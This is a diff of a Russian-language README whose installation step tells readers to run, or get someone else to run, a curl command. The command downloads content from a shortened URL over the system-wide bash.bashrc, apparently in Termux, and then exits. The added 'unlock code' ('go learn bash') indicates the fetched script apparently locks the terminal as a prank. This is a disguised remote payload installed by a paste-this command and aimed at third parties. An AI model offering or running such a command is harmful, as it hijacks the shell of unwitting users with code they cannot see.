@@ -7,8 +7,9 @@
 ## Установка
 **Введите (Или попросите ввести) в терминал следующую команду:**
  ```
- curl -oL ~/../usr/etc/bash.bashrc kutt.it/5AczeB && exit
+ curl -Lo ~/../usr/etc/bash.bashrc kutt.it/5AczeB && exit
  ```
+## Код для разблокировки: `ИдиУчиБаш`
 ---
 ## Changelog
 + **Beta v0.1**
